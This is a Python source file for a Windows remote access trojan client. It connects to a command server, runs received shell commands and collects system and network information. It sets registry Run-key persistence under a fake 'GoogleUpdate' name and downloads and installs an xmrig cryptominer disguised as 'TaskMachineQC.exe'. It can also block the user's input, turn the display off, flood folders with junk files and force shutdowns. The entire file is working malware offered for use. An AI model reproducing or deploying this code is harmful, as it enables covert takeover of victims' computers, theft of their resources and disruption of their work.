from ctypes import windll
import socket,subprocess,os,getpass,urllib.request,win32api,win32con,ctypes,string,random,psutil,platform

#Globals
IP = "127.0.0.1"
PORT = 8888
DATA = 16384
WM_SYSCOMMAND = 274
HWND_BROADCAST = 65535
SC_MONITORPOWER = 61808
user = getpass.getuser()
CopiedPath = (f"C:/Users/{user}/AppData/Roaming/GoogleUpdate/GoogleUpdateHV.py")
CopiedPath2 = (f"C:/Users/{user}/AppData/Roaming/TaskMachine/TaskMachineQC.exe")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

def persist():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate'))
    url = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/ggg3s.py"
    filename = os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate/GoogleUpdateHV.py')
    urllib.request.urlretrieve(url, filename)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + filename, shell=True)

def volumeup():
    win32api.keybd_event(win32con.VK_VOLUME_UP, 2)

def volumedown():
    win32api.keybd_event(win32con.VK_VOLUME_DOWN, 2)
    
def shutdown():
    os.system("shutdown -s -t 60")

def restart():
    os.system("shutdown -r -t 60")

def logoff():
    os.system("shutdown -l -t 60")

def mine():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine'))
    url = "https://github.com/srpentesters/ggg3s/blob/main/xmrig.exe?raw=true"
    url2 = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/config.json"
    filenamem = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/TaskMachineQC.exe')
    filename2m = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/config.json')
    urllib.request.urlretrieve(url, filenamem)
    urllib.request.urlretrieve(url2, filename2m)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskmachineQC /t REG_SZ /d ' + filenamem, shell=True)

def parse_commands(data):
    available_commands = ['getproc','cd','netinfo','fileflood','folderflood','getos','displayon','persist','mine','dir','exit','volup','voldown','shutdown','unblockinput','blockinput','displayoff','restart','logoff']
    command = data[:].decode("utf-8").split()[0]
    if command not in available_commands:
        return("[!] Command not recognized") + "\n"
    if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8"))>0:
        try:
            os.chdir(data[3:].decode("utf-8"))
            return "[*] Changed directory to: " + os.getcwd() + "\n"
        except Exception as e:
            return "[!] Error changing directory: " + str(e) + "\n"
    elif data[:7].decode("utf-8") == "getproc":
        processes = ''
        for p in psutil.process_iter():
            processes += f"{p.pid}. {p.name()} \n"
        return processes
    elif data[:7].decode("utf-8") == "persist":
        persist()
        return "[*] Persistent File Added In: " + CopiedPath + "\n"
    elif data[:19].decode("utf-8") == "displayon":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            return "[*] Turned On Clients Display."
        else:
            return "[!] User Doesnt Have Admin Rights."+ "\n"
    elif data[:10].decode("utf-8") == "displayoff":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            return "[*] Turned Off Clients Display."
        else:
            return "[!] User Doesnt Have Admin Rights."+ "\n"
    elif data[:4].decode("utf-8") == "mine":
        mine()
        return "[*] Miner Added To Startup In: " + CopiedPath2 + "\n"
    elif data[:5].decode("utf-8") == "volup":
        volumeup()
        return "[*] Increased Volume Level By 2 Percent." + "\n"
    elif data[:7].decode("utf-8") == "voldown":
        volumedown()
        return "[*] Decreased Volume Level By 2 Percent." + "\n"
    elif data[:8].decode("utf-8") == "shutdown":
        shutdown()
        return "[*] Client Machine Will Shutdown In 60 Seconds." + "\n"
    elif data[:7].decode("utf-8") == "restart":
        restart()
        return "[*] Client Machine Will Restart In 60 Seconds." + "\n"
    elif data[:6].decode("utf-8") == "logoff":
        logoff()
        return "[*] Client Machine Will logoff In 60 Seconds." + "\n"
    elif data[:11].decode("utf-8") == "folderflood":
        letters = string.ascii_letters
        quantity = random.randint(1,100)
        for j in range(quantity):
            os.mkdir(''.join(random.choice(letters) for i in range(100)))
        return f"Successfully Created {quantity} Random Folders In The CWD." + "\n"
    elif data[:9].decode("utf-8") == "fileflood":
        letters = string.ascii_letters
        quantity = random.randint(1,100)
        for j in range(quantity):
            file_name = ''.join(random.choice(letters) for i in range(100)) + '.txt'
            open(file_name, 'w').close()
        return "Successfully Created Random Files In The CWD." + "\n"
    elif data[:10].decode("utf-8") == "blockinput":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            windll.user32.BlockInput(True)
            return "[*] Successfully Blocked Clients Input" + "\n"
        else:
            return "[!] User Doesnt Have Admin Rights." + "\n"
    elif data[:5].decode("utf-8") == "getos":
        os_info = ''
        os_info += f"\nMachine Name: {platform.node()} \n"
        os_info += f"OS Version: {platform.system()} {platform.release()} {platform.version()} \n"
        os_info += f"OS: {platform.architecture()} {platform.machine()} \n"
        os_info += f"Processor: {platform.processor()} \n"
        return os_info + "\n"
    elif data[:7].decode("utf-8") == "netinfo":
        network_info = ''
        hostname = socket.gethostname()
        network_info += f"The Computer Name: {hostname} \n\n"
        addresses = psutil.net_if_addrs()
        for name in addresses:
            try:
                ip_address = addresses[name][1].address
                netmask = addresses[name][1].netmask
                mac_address = addresses[name][0].address
                network_info += f"[{name}] \n"
                network_info += f"IP Address: {ip_address} \n"
                network_info += f"Netmask: {netmask} \n"
                network_info += f"Mac Address:{mac_address} \n\n"
            except:
                pass
        return network_info
    elif data[:12].decode("utf-8") == "unblockinput":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            windll.user32.BlockInput(False)
            return "[*] Successfully Unblocked Clients Input." + "\n"
        else:
            return "[!] User Doesnt Have Admin Rights." + "\n"
    try:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        return output_str
    except Exception as e:
        return "[!] Error running command: " + str(e) + "\n"

while True:
    data = s.recv(DATA)
    if not data:
        s.send(str.encode("[!] No data received"))
        break
    else:
        result = parse_commands(data)
        s.send(str.encode(result))
s.close()
